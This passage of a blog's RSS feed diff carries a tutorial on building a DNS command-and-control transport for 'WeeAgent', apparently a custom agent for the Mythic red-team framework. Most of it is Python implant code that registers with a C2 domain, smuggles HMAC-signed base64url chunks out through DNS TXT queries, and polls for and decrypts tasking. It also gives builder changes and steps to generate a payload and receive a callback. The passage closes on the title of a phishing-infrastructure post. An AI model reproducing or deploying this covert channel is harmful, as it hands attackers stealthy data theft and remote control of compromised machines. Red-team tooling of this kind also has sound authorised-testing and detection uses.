+</span></span><span style="display:flex;"><span>    fqdn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;r.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_random_str(<span style="color:#ae81ff">4</span>),
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_random_str(<span style="color:#ae81ff">4</span>),
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>agent_config[<span style="color:#e6db74">&#34;C2Domain&#34;</span>]
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_dns_txt_query(fqdn)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response <span style="color:#f92672">and</span> len(response) <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>agent_config[<span style="color:#e6db74">&#34;_channel_id&#34;</span>] <span style="color:#f92672">=</span> response
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span></code></pre></div><h3 id="sending-data">Sending Data</h3>
+<p>Data is base64url encoded and split into 40-char chunks. Each chunk&rsquo;s HMAC is computed on the <strong>cleaned chunk</strong> (padding stripped) since <code>=</code> signs aren&rsquo;t valid in DNS labels:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_send_chunks</span>(self, encoded_data):
+</span></span><span style="display:flex;"><span>    chunks <span style="color:#f92672">=</span> [encoded_data[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(encoded_data), <span style="color:#ae81ff">40</span>)]
+</span></span><span style="display:flex;"><span>    total <span style="color:#f92672">=</span> len(chunks)
+</span></span><span style="display:flex;"><span>    channel <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>agent_config<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;_channel_id&#34;</span>, <span style="color:#e6db74">&#34;0000&#34;</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> seq, chunk <span style="color:#f92672">in</span> enumerate(chunks):
+</span></span><span style="display:flex;"><span>        chunk_clean <span style="color:#f92672">=</span> chunk<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;=&#34;</span>)
+</span></span><span style="display:flex;"><span>        sig <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_make_hmac(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>channel<span style="color:#e6db74">}{</span>seq<span style="color:#e6db74">}{</span>chunk_clean<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        fqdn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;s.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{:04x}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{:04x}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(
+</span></span><span style="display:flex;"><span>            channel, seq, total, chunk_clean, sig,
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>agent_config[<span style="color:#e6db74">&#34;C2Domain&#34;</span>]
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_dns_txt_query(fqdn)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> response:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response
+</span></span></code></pre></div><h3 id="polling-for-responses">Polling for Responses</h3>
+<p>After sending, the agent polls sequentially for response chunks. Each chunk is HMAC verified before being added to the assembled buffer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_poll_chunks</span>(self):
+</span></span><span style="display:flex;"><span>    channel <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>agent_config<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;_channel_id&#34;</span>, <span style="color:#e6db74">&#34;0000&#34;</span>)
+</span></span><span style="display:flex;"><span>    assembled <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    seq <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        fqdn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;p.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{:04x}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(channel, seq, self<span style="color:#f92672">.</span>agent_config[<span style="color:#e6db74">&#34;C2Domain&#34;</span>])
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_dns_txt_query(fqdn)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> response <span style="color:#f92672">or</span> response <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;IDLE&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> response <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;END&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        parts <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(parts) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        chunk, sig <span style="color:#f92672">=</span> parts[<span style="color:#ae81ff">0</span>], parts[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_make_hmac(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>channel<span style="color:#e6db74">}{</span>seq<span style="color:#e6db74">}{</span>chunk<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">!=</span> sig:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        assembled <span style="color:#f92672">+=</span> chunk
+</span></span><span style="display:flex;"><span>        seq <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_b64url_decode(assembled)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span></code></pre></div><h3 id="postmessageandretrieveresponse">postMessageAndRetrieveResponse</h3>
+<p>This is the main interface that the agent core calls. It wraps the full send -&gt; poll -&gt; decrypt -&gt; parse cycle:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">postMessageAndRetrieveResponse</span>(self, data):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>agent_config<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;_channel_id&#34;</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>_register():
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {}
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    formatted <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>formatMessage(data)
+</span></span><span style="display:flex;"><span>    encoded <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_b64url_encode(formatted) <span style="color:#66d9ef">if</span> isinstance(formatted, bytes) <span style="color:#66d9ef">else</span> formatted
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_send_chunks(encoded)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> result <span style="color:#f92672">or</span> result <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;ERR&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> {}
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;DONE&#34;</span>:
+</span></span><span style="display:flex;"><span>        raw <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_poll_chunks()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> raw:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            decrypted <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>decrypt(raw)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> decrypted:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> {}
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>formatResponse(decrypted)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {}
+</span></span></code></pre></div><p>Note that <code>decrypt</code> is called on the raw reassembled bytes before <code>formatResponse</code>. The Mythic response format is <code>uuid(36 bytes) + iv(16) + ciphertext + hmac(32)</code>, all binary. The decrypt function in <code>crypto_lib.py3</code> handles the AES-256-CBC decryption and HMAC verification.</p>
+<h3 id="config-section">CONFIG Section</h3>
+<p>The config section tells the builder what placeholders to replace:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">### CONFIG ###</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;C2Domain&#34;</span>: <span style="color:#e6db74">&#34;C2DOMPLACEHOLDER&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;DNSServer&#34;</span>: <span style="color:#e6db74">&#34;DNSSRVPLACEHOLDER&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;_channel_id&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Sleep&#34;</span>: callback_interval,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Jitter&#34;</span>: callback_jitter,
+</span></span></code></pre></div><h2 id="builder-integration">Builder Integration</h2>
+<p>The <code>builder.py</code> in <a href="https://yassine-elhammoumi.github.io/posts/mythic_agent/">weeagent</a> needed two changes to support the DNS profile.</p>
+<h3 id="adding-dns-to-c2_profiles">Adding dns to c2_profiles</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>c2_profiles <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;http&#34;</span>, <span style="color:#e6db74">&#34;dns&#34;</span>]
+</span></span></code></pre></div><h3 id="adding-dns-parameter-replacements">Adding DNS Parameter Replacements</h3>
+<p>In <code>_apply_c2_parameter_replacements</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>replacements <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ... existing http replacements ...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;C2DOMPLACEHOLDER&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;dns_domain&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;DNSSRVPLACEHOLDER&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;dns_server&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The placeholders are wrapped in quotes in the CONFIG section of the transport template, so the builder replaces them as string values:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#34;C2Domain&#34;</span>: <span style="color:#e6db74">&#34;C2DOMPLACEHOLDER&#34;</span>,   <span style="color:#75715e"># becomes &#34;C2Domain&#34;: &#34;infra.domain.name&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;DNSServer&#34;</span>: <span style="color:#e6db74">&#34;DNSSRVPLACEHOLDER&#34;</span>, <span style="color:#75715e"># becomes &#34;DNSServer&#34;: &#34;10.20.30.40&#34;</span>
+</span></span></code></pre></div><h3 id="updating-the-build-selection-logic">Updating the Build Selection Logic</h3>
+<p>The build function previously only looked for <code>http</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> c2 <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>c2info:
+</span></span><span style="display:flex;"><span>    profile_name <span style="color:#f92672">=</span> c2<span style="color:#f92672">.</span>get_c2profile()[<span style="color:#e6db74">&#34;name&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> profile_name <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;http&#34;</span>, <span style="color:#e6db74">&#34;dns&#34;</span>):
+</span></span><span style="display:flex;"><span>        selected_c2 <span style="color:#f92672">=</span> c2
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><h2 id="verification">Verification</h2>
+<h3 id="test-dns-resolution">Test DNS Resolution</h3>
+<p>From any external machine, verify the delegation is working:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig TXT r.test.test.infra.domain.name @&lt;your-vm-ip&gt;
+</span></span></code></pre></div><p>You should get a TXT response containing a 4-character hex channel ID, the server registered the connection and assigned it.</p>
+
+    <img src="/mythic/dns/dns_test.png"  alt="dig returning a channel ID from the DNS C2 server"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h3 id="generate-a-payload">Generate a Payload</h3>
+<p>In the Mythic UI:</p>
+<ol>
+<li><strong>Payloads → Generate New Payload</strong></li>
+<li>Select <strong>WeeAgent</strong></li>
+<li>Select <strong>dns</strong> as the C2 profile</li>
+<li>Fill in <code>dns_domain</code> (<code>infra.domain.name</code>) and <code>dns_server</code> (your VM IP)</li>
+<li>Click <strong>Generate</strong></li>
+</ol>
+<h3 id="start-the-c2-profile">Start the C2 Profile</h3>
+<p>In <strong>C2 Profiles</strong>, click <strong>Start</strong> next to the dns profile. The <code>dns_server.py</code> subprocess starts and binds to port 53.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 weeagent.py
+</span></span></code></pre></div><p>And in the Mythic UI, a new callback appears:</p>
+
+    <img src="/mythic/dns/profile-start.png"  alt="DNS C2 profile showing as running in Mythic UI"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h2 id="architecture-summary">Architecture Summary</h2>
+
+    <img src="/mythic/dns/overview.png"  alt="overview of the whole stuff"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>Building a Phishing Email Infrastructure: Postfix, DKIM, DMARC, SMTP Relay, GoPhish &amp; EvilGinx</title>
